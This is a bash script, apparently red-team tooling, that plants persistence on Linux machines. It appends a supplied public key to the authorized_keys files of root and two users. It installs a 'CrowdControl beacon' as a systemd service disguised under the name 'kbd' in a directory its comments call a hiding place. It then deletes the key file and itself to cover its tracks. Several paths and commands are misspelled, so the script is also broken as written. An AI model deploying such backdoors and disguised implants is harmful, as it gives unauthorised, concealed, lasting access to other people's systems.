#!/bin/bash
# this script deploys ssh keys and Crowd Control to linux distributions 

#deploying ssh keys to root, User1, and User2
#need to alter User1 and User2 to actual usernames before using
#assumes that the public key is located at /home/pubkey

#create .ssh directory and authorized_keys file for User1 and User2
mkdir /home/USER1/.ssh
touch /home/USER1/.ssh/authorized_keys

mkdir /home/USER2/.ssh
touch /home/USER2/.ssh/authorized_keys

#copying the public key into root, User1, and User2 authorized_keys file
cat /home/pubkey >> /root/.ssh/authorized_keys
cat /home/pubkey >> /home/User1/.ssh/authorized_keys
cat /home/pubkey >> /home/User2/.ssh/authorized_keys

#clean up ssh key deploy
rm -f /home/pubkey


#deploy CrowdControl beacon as a linux service named kbd
mkdir /media/driver0/ # directory to hide the executable
touch /media/driver0/crowdcontrol.py # the executable file

# assumes that crowdcontrol.py and crowdcontrol.service exist in the /home directory
mv /home/crowdcontrol.py /medida/driver0/crowdcontrol.py
mv /home/crowdcontrol.servce /etc/system/systemd/kbd.service

chmod +x /medida/driver0/crowdcontrol.py
systemctl daemon-reload
systemctl start kbd
systemtctl enable kbd
systemctl status kbd

# no clean up necesarry for CrowdControl Deploy
# clean up this script
rm -f ../easydeploy.sh

